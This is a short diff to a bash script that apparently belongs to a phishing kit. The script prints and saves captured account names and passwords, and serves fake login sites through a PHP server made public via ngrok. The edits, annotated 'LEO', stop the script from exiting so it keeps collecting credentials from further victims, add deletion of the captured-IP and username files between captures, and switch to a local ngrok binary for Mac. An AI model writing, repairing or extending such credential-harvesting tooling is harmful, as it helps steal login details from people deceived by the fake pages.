@@ -274,9 +274,18 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-killall -2 php > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-exit 1
+
+#LEO: do not exit, wait for more connections
+#killall -2 php > /dev/null 2>&1
+#killall -2 ngrok > /dev/null 2>&1
+#exit 1
+#LEO: as we are not exiting, need to delete files manually
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+fi
 
 }
 
@@ -430,7 +439,9 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+#./ngrok http 3333 > /dev/null 2>&1 &
+#LEO: on Mac this version of ngrok for Linus does not work, so using local ngrok
+ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
